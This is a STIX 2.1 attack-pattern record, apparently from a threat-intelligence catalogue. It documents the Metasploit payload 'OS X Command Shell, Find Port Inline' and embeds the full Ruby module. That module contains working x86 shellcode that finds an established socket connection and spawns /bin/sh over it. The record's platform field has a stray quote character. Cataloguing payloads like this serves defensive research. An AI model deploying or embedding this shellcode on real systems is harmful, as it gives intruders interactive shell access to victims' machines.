{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0318d689-af56-43f8-b9f0-a1bf7162714b",
    "created": "2024-08-14T16:33:19.351693Z",
    "modified": "2024-08-14T16:33:19.351697Z",
    "name": "OS X Command Shell, Find Port Inline",
    "description": "Spawn a shell on an established connection",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/osx/x86/shell_find_port.rb",
            "external_id": "shell_find_port.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 61\n\n  include Msf::Payload::Single\n  include Msf::Payload::Osx\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'OS X Command Shell, Find Port Inline',\n      'Description'   => 'Spawn a shell on an established connection',\n      'Author'        => 'Ramon de C Valle',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'osx',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::FindPort,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' =>\n            {\n              'CPORT' => [ 25, 'n' ],\n            },\n          'Payload' =>\n            \"\\x31\\xc0\"             + #   xorl    %eax,%eax                  #\n            \"\\x50\"                 + #   pushl   %eax                       #\n            \"\\x89\\xe7\"             + #   movl    %esp,%edi                  #\n            \"\\x6a\\x10\"             + #   pushl   $0x10                      #\n            \"\\x54\"                 + #   pushl   %esp                       #\n            \"\\x57\"                 + #   pushl   %edi                       #\n            \"\\x50\"                 + #   pushl   %eax                       #\n            \"\\x50\"                 + #   pushl   %eax                       #\n            \"\\x58\"                 + #   popl    %eax                       #\n            \"\\x58\"                 + #   popl    %eax                       #\n            \"\\x40\"                 + #   incl    %eax                       #\n            \"\\x50\"                 + #   pushl   %eax                       #\n            \"\\x50\"                 + #   pushl   %eax                       #\n            \"\\x6a\\x1f\"             + #   pushl   $0x1f                      #\n            \"\\x58\"                 + #   popl    %eax                       #\n            \"\\xcd\\x80\"             + #   int     $0x80                      #\n            \"\\x66\\x81\\x7f\\x02\\x04\\xd2\" + #   cmpw    $0xd204,0x02(%edi)         #\n            \"\\x75\\xee\"             + #   jne     <fndsockcode+11>           #\n            \"\\x50\"                 + #   pushl   %eax                       #\n            \"\\x6a\\x5a\"             + #   pushl   $0x5a                      #\n            \"\\x58\"                 + #   popl    %eax                       #\n            \"\\xcd\\x80\"             + #   int     $0x80                      #\n            \"\\xff\\x4f\\xf0\"         + #   decl    -0x10(%edi)                #\n            \"\\x79\\xf6\"             + #   jns     <fndsockcode+30>           #\n            \"\\x68\\x2f\\x2f\\x73\\x68\" + #   pushl   $0x68732f2f                #\n            \"\\x68\\x2f\\x62\\x69\\x6e\" + #   pushl   $0x6e69622f                #\n            \"\\x89\\xe3\"             + #   movl    %esp,%ebx                  #\n            \"\\x50\"                 + #   pushl   %eax                       #\n            \"\\x54\"                 + #   pushl   %esp                       #\n            \"\\x54\"                 + #   pushl   %esp                       #\n            \"\\x53\"                 + #   pushl   %ebx                       #\n            \"\\x50\"                 + #   pushl   %eax                       #\n            \"\\xb0\\x3b\"             + #   movb    $0x3b,%al                  #\n            \"\\xcd\\x80\"               #   int     $0x80                      #\n        }\n      ))\n  end\nend\n",
    "x_mitre_platforms": [
        "osx'"
    ]
}